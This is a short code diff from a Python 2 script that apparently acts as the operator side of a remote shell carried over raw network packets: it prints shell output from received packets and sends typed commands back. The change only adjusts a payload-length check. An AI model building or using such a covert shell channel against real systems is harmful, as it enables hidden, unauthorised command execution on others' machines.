@@ -48,7 +48,7 @@ def action(pkt):
                 elif buff[4:8] == port:
                         print "Port"
                 elif buff[4:8] == shell:
-			if len(buff[8:]) > 0:
+			if len(buff[8:]) > 3:
                         	sys.stdout.write(buff[8:])
     				sys.stdout.flush()
 			sendp(packet_builder(shell + raw_input()), verbose=0, iface=sys.argv[2])
